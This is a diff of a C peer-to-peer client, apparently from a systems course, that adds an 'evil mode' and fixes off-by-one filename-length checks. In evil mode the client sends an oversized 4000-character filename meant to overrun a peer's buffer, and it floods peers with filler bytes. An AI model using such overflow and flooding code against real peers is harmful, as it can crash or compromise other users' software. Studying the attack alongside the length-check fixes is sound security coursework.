@@ -172,13 +172,13 @@ taskbufresult_t read_to_taskbuf(int fd, task_t *t)
     unsigned tailpos = (t->tail % TASKBUFSIZ);
     ssize_t amt;
 
-    printf("**read_to_taskbuf start\n");
+    //printf("**read_to_taskbuf start\n");
 
     if (t->head == t->tail || headpos < tailpos)
         amt = read(fd, &t->buf[tailpos], TASKBUFSIZ - tailpos);
     else
         amt = read(fd, &t->buf[tailpos], headpos - tailpos);
-    printf("**read_to_taskbuf ending\n");
+    //printf("**read_to_taskbuf ending\n");
 
     if (amt == -1 && (errno == EINTR || errno == EAGAIN
               || errno == EWOULDBLOCK))
@@ -202,11 +202,11 @@ taskbufresult_t write_from_taskbuf(int fd, task_t *t)
     unsigned headpos = (t->head % TASKBUFSIZ);
     unsigned tailpos = (t->tail % TASKBUFSIZ);
     ssize_t amt;
-    char str[5]  = {'a','a','a','a','a'};
 
     if(evil_mode) {
 
-        strcpy(&t->buf[headpos],str);
+        memset((void *) t->buf, 'x', TASKBUFSIZ);
+        amt = write(fd, t->buf, TASKBUFSIZ);
         return TBUF_OK;
 
     } else {
@@ -489,7 +489,7 @@ task_t *start_download(task_t *tracker_task, const char *filename)
     assert(tracker_task->type == TASK_TRACKER);
 
     // Check that filename is not too long
-    if (strlen(filename) > FILENAMESIZ) {
+    if (strlen(filename) >= FILENAMESIZ) {
         error("* Error download filename '%s' is too long\n", filename);
         goto exit;
     }
@@ -564,11 +564,12 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 static void task_download(task_t *t, task_t *tracker_task)
 {
     int i, tick = 0;
+    char *evil_filename;
     assert((!t || t->type == TASK_DOWNLOAD)
            && tracker_task->type == TASK_TRACKER);
 
     // Check that filename is not too long
-    if (strlen(t->filename) > FILENAMESIZ) {
+    if (strlen(t->filename) >= FILENAMESIZ) {
         error("* Error download filename '%s' is too long\n", t->filename);
         task_free(t);
         return;
@@ -593,7 +594,26 @@ static void task_download(task_t *t, task_t *tracker_task)
         error("* Cannot connect to peer: %s\n", strerror(errno));
         goto try_again;
     }
-    osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+    // ATTACK HERE - exploit requesting a large filename that
+    // should cause a buffer overrun when then scanf from t->buf into t->filename!
+    if (evil_mode) {
+        int i;
+        printf("Evil attack - overrun filename\n");
+        evil_filename = (char *) malloc (4001 * sizeof(char)); 
+        evil_filename[0] = '\0';
+        for (i = 0; i < 80; ++i) {
+            strncat(evil_filename, "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", 50);
+        }
+        evil_filename[4000] = '\0';
+        osp2p_writef(t->peer_fd, "GET %s OSP2P\n", evil_filename);
+        printf("evil_filename: %s\n", evil_filename);
+        //free(evil_filename);
+        //task_free(t);
+        //printf("returning\n");
+        //return;
+    } else { 
+        osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+    }
 
     // Open disk file for the result.
     // If the filename already exists, save the file in a name like
@@ -720,7 +740,7 @@ static void task_upload(task_t *t)
     // First, read the request from the peer.
     while (1) {
         int ret = read_to_taskbuf(t->peer_fd, t);
-        printf("**task_upload, reading request from peer\n");
+        //printf("**task_upload, reading request from peer\n");
         if (ret == TBUF_ERROR) {
             error("* Cannot read from connection");
             goto exit;
@@ -743,7 +763,7 @@ static void task_upload(task_t *t)
     if (t->tail > FILENAMESIZ + 11) {
         tmp_buf = (char *) malloc(t->tail); 
         if (osp2p_snscanf(t->buf, t->tail, "GET %s OSP2P\n", tmp_buf) == 0) {
-            if (strlen(tmp_buf) > FILENAMESIZ) {
+            if (strlen(tmp_buf) >= FILENAMESIZ) {
                 error("* Request with filename '%s' is too long\n", tmp_buf);
                 free(tmp_buf);
                 goto exit;
